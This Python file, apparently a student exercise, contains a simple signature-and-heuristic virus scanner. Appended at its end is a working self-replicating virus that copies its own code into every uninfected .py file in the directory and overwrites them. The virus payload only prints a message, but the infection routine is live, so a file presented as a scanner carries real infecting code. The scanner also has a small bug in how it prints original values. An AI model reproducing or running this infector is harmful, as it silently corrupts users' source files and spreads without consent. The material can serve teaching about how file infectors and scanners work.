# virus scan program
# McKenna Branting
# walked through code with Shad Sluiter video:
# https://www.youtube.com/watch?v=diRy9KyBvX0
# https://www.youtube.com/watch?v=5Qw3-wQUMFs
import glob
import re
import os
import csv


# scan for signatures

def checkForSignatures():
    print("###### checking for virus signatures")

    # get all programs in directory
    programs = glob.glob("*.py")
    for p in programs:
        thisFileInfected = False
        file = open(p, "r")
        lines = file.readlines()
        file.close()

        for line in lines:
            if re.search("^# virus in python", line):
                # found a virus
                print("!!!! virus found in file" + p)
                thisFileInfected = True
        if thisFileInfected == False:
            print(p + "appears to be clean")

        print("##### end of section #####")


def getFileData():
    # get an initial scan of file size and date modified
    programs = glob.glob("*.py")
    programList = []
    for p in programs:
        programSize = os.path.getsize(p)
        programModified = os.path.getmtime(p)
        programData = [p, programSize, programModified]

        programList.append(programData)
    return programList


def WriteFileData(programs):
    if os.path.exists("fileData.txt"):
        return
    with open("fileData.txt", "w") as file:
        wr = csv.writer(file)
        wr.writerows(programs)


def checkForChanges():
    print("#### check for heuristic changes in the files ####")
    # open the fileData.txt file and compare each line
    # to the current file size and dates

    with open("fileData.txt") as file:
        fileList = file.read().splitlines()
    originalFileList = []
    for each in fileList:
        items = each.split(',')
        originalFileList.append(items)

    # get current data from directory
    currentFileList = getFileData()

    # compare old and current items and check for differences
    for c in currentFileList:
        for o in originalFileList:
            if c[0] == o[0]:
                # file names matched
                if str(c[1]) != str(o[1]) or str(c[2]) != (o[2]):
                    # file sizes or dates do not match
                    print("\n##########\nAlert. File mismatch!")
                    # print the data of each file
                    print("Current values =" + str(c))
                    print("Original values =" + str(0))
                else:
                    print("File " + c[0] + " appears to be unchanged")


# do an initial scan and save the results to a text file
WriteFileData(getFileData())

checkForSignatures()
checkForChanges()
# virus in python
# McKenna Branting
# walked through code with Shad Sluiter video:

import glob
import re
import sys

# put copy of all these lines into a list
virusCode = []

# open the file and read all lines
# filter out all lines that are not inside the virus code boundary

thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()

# save all lines into a list to use later
inVirus = False
for line in lines:
    if re.search("^# virus in python", line):
        inVirus = True

        # if virus code has been found start appending
        # lines to virusCode list.
        # Assume that virus code is always appended to end
    if inVirus == True:
        virusCode.append(line)

    if re.search("^# end of virus code", line):
        break

# find potential victims

programs = glob.glob("*.py")

# check and infect all programs that glob found
for p in programs:
    file = open(p, "r")
    programCode = file.readlines()
    file.close()

    # check to see if file is infected already
    infected = False
    for line in programCode:
        if re.search("^# virus in python", line):
            infected = True
            break
        # stop we dont need to try to infect program again

    if not infected:
        newCode = []
        # new version = current + virus code
        newCode = programCode
        newCode.extend(virusCode)

        # write the new version to the file. Overwrite to original
        file = open(p, "w")
        file.writelines(newCode)
        file.close()

# payload - do your evil work here
print("this file is infected")

# end of virus code
